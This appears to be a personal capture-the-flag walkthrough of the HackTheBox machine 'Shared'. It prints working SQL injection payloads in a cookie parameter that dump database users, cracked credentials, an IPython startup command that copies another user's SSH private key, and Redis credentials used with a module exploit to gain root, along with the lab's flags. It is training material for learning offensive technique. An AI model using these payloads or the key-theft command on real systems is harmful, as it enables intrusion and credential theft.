# Enumeration 

## *Open Ports:*

80/tcp http 
443/tcp https ssl/http syn-ack ttl 63 nginx 1.18.0
22/tcp ssh
![[Pasted image 20221112123124.png]]

- running gobuster we found nothing 
## *Http(s) enum*
- found a CVE for the current prestashop version but looks like it's a rabbit hole and didn't work so maybe the server is patched


- trying to add a item to wish list found login page and made an account
![[Pasted image 20221112153215.png]]

- trying to buy an item sent me to checkout.shared.htb subdomain after adding it to /etc/hosts files
- tried to look for more subdomains with gobuster but got nothing 
![[Pasted image 20221112124436.png]]


# *Exploitation* 

- trying to type stuff in the credit card and CVV but always gets pop up and nothing shows on burp 
- going back to the main page found new value added to cookies
![[Pasted image 20221112153354.png]]
-  found that SQLI in custom cart parameter and we can use that to dump the database 
![[Pasted image 20221112153940.png]]



- dumping database 


```
{"53GG2EF8' AND 1=2 UNION SELECT 1,group_concat(table_name),3 from information_schema.tables-- a":"1"}; 
```


![[Pasted image 20221112155023.png]]

- dumping columns 
```
"53GG2EF8' AND 1=2 UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name= 'user'-- a":"1"};
```

![[Pasted image 20221112155640.png]]

- dumping user 

```
{"53GG2EF8' AND 1=2 UNION SELECT 1,group_concat(id,username,0x3a,0x3a,password),3 FROM user-- a":"1"};
```



![[Pasted image 20221112160229.png]]
- hashed password:fc895d4eddc2fc12f995e18c865cf273
- https://hashes.com/en/tools/hash_identifier
![[Pasted image 20221112160937.png]]
















# *Foothold* 

- james_mason:Soleil101

- we are in as user james_mason
![[Pasted image 20221112161018.png]]
found database creds in website directory /var/www/checkout.shared.htb/config 
![[Pasted image 20221112164236.png]]
-  didn't really find anything in the database so back to enumerating 


- using pspy and linpeas found that Ipython runs on the machine
![[Pasted image 20221112165248.png]]
- trying to find ways to priv esc on google using ipython
- found a github repo talking about ipython and how it can lead to priv esc
- https://github.com/advisories/GHSA-pq7m-3gw7-gq5x
- adding the commands to /opt/scripts_review/

```
mkdir -m 777 /opt/scripts_review/profile_default/
mkdir -m 777 /opt/scripts_review/profile_default/startup
echo "import os;os.system('cat ~/.ssh/id_rsa > ~/dan_smith.key')" > /opt/scripts_review/profile_default/startup/poc.py
```

- copying the key to our machine 
```
nano key 
chmod 600 key
ssh -i key dan_smith@10.129.30.186 
```
![[Pasted image 20221112171820.png]]


## *Privesc to root*

- and we are in as the user dan smith 

![[Pasted image 20221112173221.png]]
#userflag 0abbf99d92265845c2d050932c2fc14f

- running linpeas again

- this file might be interesting cos it's owned by root and readable by our group
![[Pasted image 20221112173744.png]]
![[Pasted image 20221112173749.png]]

- it's a binary file so let's try to upload it on our machine and see what it does 
![[Pasted image 20221112174027.png]]

![[Pasted image 20221112174106.png]]

- looks like it's trying to connect to port 6379 
- trying to open a listener on port 6379 and here is the result
![[Pasted image 20221112174155.png]]
- looks like password so all we need to do now is to try to find username 

- after some time trying username/passwords we tried to search for default redis creds
- https://redis.io/commands/auth/
- found that if there is only password specified then the username is default
![[Pasted image 20221112174827.png]]
- :F2WHqJUz2WEz=Gqq
![[Pasted image 20221112175157.png]]
- we are in redis
- using https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis
- to try to leverage this 

- found a GitHub repo for redis exploit
- https://github.com/n0b0dyCN/RedisModules-ExecuteCommand

![[Pasted image 20221112180600.png]]

- and we are root and now we execute a reverse shell

![[Pasted image 20221112180856.png]]
#rootflag b82775a9f3da5b19d70417a2a8eb77b1


| Service | Username | password |
| ------- | -------- | -------- |
| Prestashop|james_mason|Soleil101 |
| ssh|dan_smith|(ssh_key from ipython) |
